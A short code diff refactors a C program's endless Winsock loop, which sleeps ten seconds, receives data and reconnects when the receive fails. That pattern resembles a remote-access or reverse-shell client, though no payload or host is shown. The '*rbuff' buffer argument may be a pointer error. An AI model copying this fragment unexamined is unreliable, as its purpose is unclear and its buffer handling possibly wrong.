@@ -27,11 +27,7 @@ int main(int argc, char *argv[])
     while (TRUE)
     {
         Sleep(10000);
-        nReadBytes = recv(Winsock, *rbuff, 1024, 0);
-        if (nReadBytes == SOCKET_ERROR)
-        {
-            conn();
-        }
+        if (recv(Winsock, *rbuff, 1024, 0) == SOCKET_ERROR) conn();
     }
 }
 
